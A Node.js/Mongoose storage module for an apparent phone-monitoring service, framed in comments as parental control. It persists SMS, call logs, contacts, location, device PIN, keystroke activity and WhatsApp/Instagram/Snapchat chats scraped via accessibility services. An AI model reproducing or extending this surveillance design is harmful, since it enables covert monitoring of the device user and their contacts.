const mongoose = require('mongoose');
const crypto = require('crypto');
const MONGODB_URI = process.env.MONGODB_URI || '';
let connected = false;

async function connectMongo() {
    if (!MONGODB_URI) { console.warn('MONGODB_URI not set'); return false; }
    if (connected && mongoose.connection.readyState === 1) return true;
    connected = false;
    try {
        await mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 8000 });
        connected = true;
        console.log('MongoDB connected', mongoose.connection.name);
        return true;
    } catch (e) {
        console.error('MongoDB connect failed', e.message);
        return false;
    }
}
function isReady() { return connected && mongoose.connection.readyState === 1; }

mongoose.connection.on('disconnected', () => {
    connected = false;
    console.warn('MongoDB disconnected; writes will be retried after reconnect');
});
mongoose.connection.on('error', (err) => {
    if (mongoose.connection.readyState !== 1) connected = false;
    console.error('MongoDB connection error', err && err.message);
});

const DeviceMeta = mongoose.models.DeviceMeta || mongoose.model('DeviceMeta', new mongoose.Schema({
    deviceId: { type: String, unique: true, index: true },
    model: String, pin: String, network: mongoose.Schema.Types.Mixed,
    lastLocation: mongoose.Schema.Types.Mixed, lastSeen: Number,
    updatedAt: { type: Date, default: Date.now }
}, { collection: 'devices' }));

const History = mongoose.models.History || mongoose.model('History', new mongoose.Schema({
    deviceId: { type: String, index: true },
    type: { type: String, index: true },
    data: mongoose.Schema.Types.Mixed,
    createdAt: { type: Date, default: Date.now, index: true }
}, { collection: 'device_history' }));

// Structured Live Activity events (persistent history)
const ActivityEventSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    application: { type: String, default: 'Other' },
    packageName: { type: String, default: '' },
    actorName: { type: String, default: '' },
    action: { type: String, default: 'activity' },
    message: { type: String, default: '' },
    text: { type: String, default: '' }, // original free-text for live card
    timestamp: { type: Date, default: Date.now, index: true },
    eventId: { type: String, required: true }
}, { collection: 'activity_events' });
ActivityEventSchema.index({ deviceId: 1, eventId: 1 }, { unique: true });
ActivityEventSchema.index({ deviceId: 1, timestamp: -1 });

const ActivityEvent = mongoose.models.ActivityEvent || mongoose.model('ActivityEvent', ActivityEventSchema);

// Persistent chat messages (WhatsApp / Instagram / Snapchat)
const ChatMessageSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    app: { type: String, required: true, index: true }, // whatsapp | instagram | snapchat
    packageName: { type: String, default: '' },
    conversation: { type: String, required: true, index: true },
    conversationId: { type: String, default: '', index: true },
    contactName: { type: String, default: '' },
    sender: { type: String, default: '' },
    text: { type: String, default: '' },
    message: { type: String, default: '' },
    direction: { type: String, default: 'IN' }, // IN | OUT (legacy-compatible)
    status: { type: String, default: 'received' }, // sent | received
    messageType: { type: String, default: 'TEXT' },
    source: { type: String, default: 'accessibility' },
    timestamp: { type: Number, default: Date.now, index: true },
    clientTimestamp: { type: Number, default: 0 },
    serverTimestamp: { type: Number, default: Date.now },
    eventId: { type: String, default: '' },
    createdAt: { type: Date, default: Date.now, index: true },
    msgKey: { type: String, required: true } // stable event/fingerprint dedupe key
}, { collection: 'chat_messages' });
ChatMessageSchema.index({ deviceId: 1, app: 1, conversation: 1, timestamp: -1 });
ChatMessageSchema.index({ deviceId: 1, app: 1, msgKey: 1 }, { unique: true });
const ChatMessage = mongoose.models.ChatMessage || mongoose.model('ChatMessage', ChatMessageSchema);


async function upsertDevice(deviceId, fields = {}) {
    if (!isReady() || !deviceId) return;
    const id = String(deviceId).toUpperCase().trim();
    try {
        await DeviceMeta.findOneAndUpdate({ deviceId: id }, { $set: { ...fields, deviceId: id, updatedAt: new Date() } }, { upsert: true });
    } catch (e) {}
}

async function saveHistory(deviceId, type, data) {
    if (!isReady() || !deviceId || !type) return;
    const id = String(deviceId).toUpperCase().trim();
    try {
        if (['contacts','apps','installed_apps','call_logs','sms'].includes(type)) {
            const t = type === 'installed_apps' ? 'apps' : type;
            await History.deleteMany({ deviceId: id, type: t, 'data._snapshot': true });
            await History.create({ deviceId: id, type: t, data: { _snapshot: true, items: Array.isArray(data) ? data : [data] }, createdAt: new Date() });
            return;
        }
        if (type === 'network') {
            await upsertDevice(id, { network: data });
            await History.findOneAndUpdate(
                { deviceId: id, type: 'network', 'data._singleton': true },
                { $set: { data: { _singleton: true, ...(data || {}) }, createdAt: new Date() } },
                { upsert: true }
            );
            return;
        }
        if (type === 'location') {
            const loc = Array.isArray(data) ? data[data.length - 1] : data;
            await upsertDevice(id, { lastLocation: loc });
            await History.findOneAndUpdate(
                { deviceId: id, type: 'location', 'data._singleton': true },
                { $set: { data: { _singleton: true, ...(loc || {}) }, createdAt: new Date() } },
                { upsert: true }
            );
            return;
        }
        // live_status: do NOT flood device_history with every keystroke.
        // Structured activity_events collection is the source of truth for Live Activity history.
        if (type === 'live_status') {
            return;
        }
        const items = Array.isArray(data) ? data : [data];
        const docs = items.map(item => ({
            deviceId: id, type, data: item,
            createdAt: new Date(item.timestamp || item.postTime || Date.now())
        }));
        if (docs.length) await History.insertMany(docs, { ordered: false }).catch(() => {});
        const cutoff = new Date(Date.now() - 180 * 24 * 60 * 60 * 1000);
        await History.deleteMany({ deviceId: id, type, createdAt: { $lt: cutoff } }).catch(() => {});
    } catch (e) { console.error('saveHistory', type, e.message); }
}

async function loadHistory(deviceId, type, limit = 500) {
    if (!isReady() || !deviceId) return null;
    const id = String(deviceId).toUpperCase().trim();
    try {
        if (['contacts','apps','installed_apps','call_logs','sms'].includes(type)) {
            const t = type === 'installed_apps' ? 'apps' : type;
            const snap = await History.findOne({ deviceId: id, type: t, 'data._snapshot': true }).sort({ createdAt: -1 }).lean();
            return snap && snap.data && snap.data.items ? snap.data.items : [];
        }
        if (type === 'network' || type === 'location') {
            const row = await History.findOne({ deviceId: id, type, 'data._singleton': true }).lean();
            if (row) return row.data;
        }
        // Prefer structured activity_events for live_status history
        if (type === 'live_status') {
            const events = await loadActivityEvents(id, limit);
            if (events && events.length) {
                return events.map(e => ({
                    text: e.text || formatActivityText(e),
                    timestamp: e.timestamp ? new Date(e.timestamp).getTime() : Date.now(),
                    application: e.application,
                    packageName: e.packageName,
                    actorName: e.actorName,
                    action: e.action,
                    message: e.message,
                    eventId: e.eventId
                }));
            }
        }
        const rows = await History.find({ deviceId: id, type }).sort({ createdAt: -1 }).limit(Math.min(limit, 5000)).lean();
        return rows.map(r => r.data);
    } catch (e) { return null; }
}

function formatActivityText(e) {
    if (!e) return '';
    if (e.text) return e.text;
    const app = e.application || 'App';
    const actor = e.actorName || '';
    const msg = e.message || '';
    const act = e.action || 'activity';
    if (actor && msg) return `${app} → ${actor} : ${msg}`;
    if (msg) return `${app} ${act}: ${msg}`;
    return app;
}

/**
 * Save one structured activity event. Dedupes by deviceId + eventId (unique index).
 * Returns the saved doc or null if duplicate / skipped.
 */
async function saveActivityEvent(deviceId, event) {
    if (!isReady() || !deviceId || !event) return null;
    const id = String(deviceId).toUpperCase().trim();
    const eventId = String(event.eventId || '').trim();
    if (!eventId) return null;
    try {
        const doc = {
            deviceId: id,
            application: event.application || 'Other',
            packageName: event.packageName || '',
            actorName: event.actorName || '',
            action: event.action || 'activity',
            message: event.message || '',
            text: event.text || '',
            timestamp: event.timestamp ? new Date(event.timestamp) : new Date(),
            eventId
        };
        // upsert with unique eventId → no duplicate inserts
        const saved = await ActivityEvent.findOneAndUpdate(
            { deviceId: id, eventId },
            { $setOnInsert: doc },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        ).lean();
        // prune old (keep ~90 days)
        const cutoff = new Date(Date.now() - 90 * 24 * 60 * 60 * 1000);
        await ActivityEvent.deleteMany({ deviceId: id, timestamp: { $lt: cutoff } }).catch(() => {});
        return saved;
    } catch (e) {
        // duplicate key → already stored
        if (e && e.code === 11000) return null;
        console.error('saveActivityEvent', e.message);
        return null;
    }
}

async function loadActivityEvents(deviceId, limit = 200) {
    if (!isReady() || !deviceId) return [];
    const id = String(deviceId).toUpperCase().trim();
    try {
        const rows = await ActivityEvent.find({ deviceId: id })
            .sort({ timestamp: -1 })
            .limit(Math.min(Number(limit) || 200, 1000))
            .lean();
        return rows;
    } catch (e) {
        return [];
    }
}

async function clearActivityEvents(deviceId) {
    if (!isReady() || !deviceId) return 0;
    const id = String(deviceId).toUpperCase().trim();
    try {
        const r = await ActivityEvent.deleteMany({ deviceId: id });
        return r.deletedCount || 0;
    } catch (e) {
        return 0;
    }
}

// Boot health status (latest per device + deduped event log)
const BootStatusSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    bootSessionId: { type: String, required: true, index: true },
    eventType: { type: String, required: true },
    serviceName: { type: String, default: '' },
    status: { type: String, default: 'SUCCESS' },
    message: { type: String, default: '' },
    eventKey: { type: String, required: true },
    timestamp: { type: Number, default: Date.now },
    createdAt: { type: Date, default: Date.now }
}, { collection: 'boot_status' });
BootStatusSchema.index({ deviceId: 1, eventKey: 1 }, { unique: true });
BootStatusSchema.index({ deviceId: 1, timestamp: -1 });
const BootStatus = mongoose.models.BootStatus || mongoose.model('BootStatus', BootStatusSchema);

async function saveBootStatus(deviceId, event) {
    if (!isReady() || !deviceId || !event) return null;
    const id = String(deviceId).toUpperCase().trim();
    const eventKey = String(event.eventKey || '').trim();
    if (!eventKey) return null;
    try {
        const doc = {
            deviceId: id,
            bootSessionId: event.bootSessionId || '',
            eventType: event.eventType || 'SERVICE_STATUS',
            serviceName: event.serviceName || '',
            status: event.status || 'SUCCESS',
            message: event.message || '',
            eventKey,
            timestamp: event.timestamp || Date.now(),
            createdAt: new Date()
        };
        const saved = await BootStatus.findOneAndUpdate(
            { deviceId: id, eventKey },
            { $setOnInsert: doc },
            { upsert: true, new: true, setDefaultsOnInsert: true }
        ).lean();
        // prune older than 30 days
        const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
        await BootStatus.deleteMany({ deviceId: id, createdAt: { $lt: cutoff } }).catch(() => {});
        return saved;
    } catch (e) {
        if (e && e.code === 11000) return null;
        console.error('saveBootStatus', e.message);
        return null;
    }
}

async function loadLatestBootStatus(deviceId) {
    if (!isReady() || !deviceId) return null;
    const id = String(deviceId).toUpperCase().trim();
    try {
        const complete = await BootStatus.findOne({
            deviceId: id,
            eventType: 'BOOT_COMPLETE'
        }).sort({ timestamp: -1 }).lean();
        if (complete) return complete;
        return await BootStatus.findOne({ deviceId: id }).sort({ timestamp: -1 }).lean();
    } catch (e) {
        return null;
    }
}

async function loadAllBootEvents(deviceId, limit = 100) {
    if (!isReady() || !deviceId) return [];
    const id = String(deviceId).toUpperCase().trim();
    try {
        const rows = await BootStatus.find({ deviceId: id })
            .sort({ timestamp: -1 })
            .limit(Math.min(Number(limit) || 100, 500))
            .lean();
        return rows;
    } catch (e) {
        return [];
    }
}


async function saveChatMessages(deviceId, appKey, messages) {
    if (!isReady() || !deviceId || !appKey || !Array.isArray(messages) || !messages.length) return 0;
    const id = String(deviceId).toUpperCase().trim();
    const app = String(appKey).toLowerCase();
    let saved = 0;
    for (const m of messages) {
        try {
            const text = String(m.text || m.message || '').trim();
            const conversation = String(m.conversation || m.contact || '').trim();
            if (!text || !conversation) {
                console.warn('[CHAT_MONGO_SKIP_EMPTY]', JSON.stringify({ deviceId: id, app, text: text.slice(0, 120), conversation }));
                continue;
            }
            const rawDirection = String(m.direction || 'IN').toUpperCase();
            const direction = (rawDirection === 'OUT' || rawDirection === 'OUTGOING' || rawDirection === 'SENT') ? 'OUT' : 'IN';
            const ts = Number(m.timestamp) || Date.now();
            const eventId = String(m.eventId || '').trim();
            // Prefer a source event ID; otherwise use a deterministic short time bucket fingerprint.
            const fallbackKey = crypto.createHash('sha256')
                .update([id, app, conversation.toLowerCase(), direction, text, Math.floor(ts / 5000)].join('|'))
                .digest('hex');
            const msgKey = eventId || fallbackKey;
            const conversationId = String(m.conversationId || conversation).trim();
            const serverTimestamp = Date.now();
            // An Instagram accessibility/notification scan can mislabel the child’s
            // already-sent bubble as IN. Never save a same-contact, same-text IN row when
            // a nearby OUT row already exists; this keeps the parent page left/right truth.
            if (app === 'instagram' && direction === 'IN') {
                const mirroredOut = await ChatMessage.findOne({
                    deviceId: id,
                    app,
                    conversation,
                    direction: 'OUT',
                    text,
                    timestamp: { $gte: ts - 5 * 60 * 1000, $lte: ts + 5 * 60 * 1000 }
                }).select({ _id: 1, eventId: 1 }).lean();
                if (mirroredOut) {
                    console.log('[CHAT_MONGO_SKIP_MIRRORED_INSTAGRAM_IN]', JSON.stringify({
                        deviceId: id, app, conversation, text: text.slice(0, 120), eventId,
                        mirroredOutEventId: mirroredOut.eventId || ''
                    }));
                    continue;
                }
            }

            // Accessibility may report the same sent bubble once from the Send event and
            // once from the rendered chat row. Treat that short-window replay as one event,
            // while keeping incoming and outgoing directions separate.
            const nearDuplicate = await ChatMessage.findOne({
                deviceId: id,
                app,
                conversation,
                direction,
                text,
                timestamp: { $gte: ts - 5000, $lte: ts + 5000 }
            }).select({ _id: 1 }).lean();
            if (nearDuplicate) {
                console.log('[CHAT_MONGO_SKIP_NEAR_DUP]', JSON.stringify({ deviceId: id, app, conversation, direction, text: text.slice(0, 120), timestamp: ts, eventId }));
                continue;
            }
            await ChatMessage.updateOne(
                { deviceId: id, app, msgKey },
                {
                    $setOnInsert: {
                        deviceId: id,
                        app,
                        packageName: m.packageName || '',
                        conversation,
                        conversationId,
                        contactName: String(m.contactName || conversation),
                        sender: direction === 'OUT' ? 'You' : (m.sender || conversation),
                        text,
                        message: text,
                        direction,
                        status: direction === 'OUT' ? 'sent' : 'received',
                        messageType: m.messageType || 'TEXT',
                        source: m.source || 'accessibility',
                        timestamp: ts,
                        clientTimestamp: Number(m.clientTimestamp || ts),
                        serverTimestamp,
                        eventId,
                        createdAt: new Date(serverTimestamp),
                        msgKey
                    }
                },
                { upsert: true }
            );
            saved++;
            console.log('[CHAT_MONGO_SAVED]', JSON.stringify({ deviceId: id, app, conversation, direction, text: text.slice(0, 120), timestamp: ts, eventId, msgKey }));
        } catch (e) {
            console.error('[CHAT_MONGO_ERROR]', JSON.stringify({ deviceId: id, app, error: e && e.message, direction: m && m.direction, conversation: m && m.conversation, text: String((m && (m.text || m.message)) || '').slice(0, 120) }));
        }
    }
    return saved;
}

async function loadChatMessages(deviceId, appKey, contact, limit = 500) {
    if (!isReady() || !deviceId || !appKey) return [];
    const id = String(deviceId).toUpperCase().trim();
    const app = String(appKey).toLowerCase();
    const packageNames = app === 'whatsapp'
        ? ['com.whatsapp', 'com.whatsapp.w4b']
        : app === 'instagram'
        ? ['com.instagram.android']
        : app === 'snapchat'
        ? ['com.snapchat.android']
        : [];
    const q = { deviceId: id, app, packageName: { $in: packageNames } };
    if (contact && contact !== 'all') q.conversation = contact;
    try {
        const rows = await ChatMessage.find(q).sort({ timestamp: -1 }).limit(Math.min(Number(limit) || 500, 5000)).lean();
        // Hide legacy mirrored Instagram IN rows at read time as well. This makes the
        // parent UI correct immediately without silently deleting historical database data.
        const visibleRows = app === 'instagram' ? rows.filter(r => {
            if (String(r.direction || '').toUpperCase() !== 'IN') return true;
            return !rows.some(o => String(o.direction || '').toUpperCase() === 'OUT'
                && String(o.conversation || '') === String(r.conversation || '')
                && String(o.text || '') === String(r.text || '')
                && Math.abs(Number(o.timestamp || 0) - Number(r.timestamp || 0)) <= 5 * 60 * 1000);
        }) : rows;
        return visibleRows.map(r => ({
            id: String(r._id),
            deviceId: r.deviceId,
            packageName: r.packageName,
                conversation: r.conversation,
                conversationId: r.conversationId || r.conversation,
                contactName: r.contactName || r.conversation,
                sender: r.sender,
                text: r.text,
                message: r.message || r.text,
                timestamp: r.timestamp,
                clientTimestamp: r.clientTimestamp || r.timestamp,
                serverTimestamp: r.serverTimestamp || 0,
                eventId: r.eventId || r.msgKey,
                createdAt: r.createdAt,
                status: r.status || (r.direction === 'OUT' ? 'sent' : 'received'),
                messageType: r.messageType,
                direction: r.direction,
                source: r.source,
                app: r.app
        }));
    } catch (e) {
        console.error('loadChatMessages', e.message);
        return [];
    }
}

async function loadChatContacts(deviceId, appKey) {
    if (!isReady() || !deviceId || !appKey) return [];
    const id = String(deviceId).toUpperCase().trim();
    const app = String(appKey).toLowerCase();
    const packageNames = app === 'whatsapp'
        ? ['com.whatsapp', 'com.whatsapp.w4b']
        : app === 'instagram'
        ? ['com.instagram.android']
        : app === 'snapchat'
        ? ['com.snapchat.android']
        : [];
    try {
        const rows = await ChatMessage.aggregate([
            { $match: { deviceId: id, app, packageName: { $in: packageNames } } },
            { $sort: { timestamp: -1 } },
            { $group: {
                _id: '$conversation',
                conversation: { $first: '$conversation' },
                lastMessage: { $first: '$text' },
                timestamp: { $first: '$timestamp' },
                lastDirection: { $first: '$direction' },
                count: { $sum: 1 }
            }},
            { $sort: { timestamp: -1 } }
        ]);
        return rows.map(r => ({
            conversation: r.conversation,
            lastMessage: r.lastMessage || '',
            timestamp: r.timestamp || 0,
            lastDirection: r.lastDirection || 'IN',
            count: r.count || 0
        }));
    } catch (e) {
        console.error('loadChatContacts', e.message);
        return [];
    }
}

module.exports = {
    connectMongo, isReady, upsertDevice, saveHistory, loadHistory, saveChatMessages, loadChatMessages, loadChatContacts,
    saveActivityEvent, loadActivityEvents, clearActivityEvents, formatActivityText,
    saveBootStatus, loadLatestBootStatus, loadAllBootEvents
};
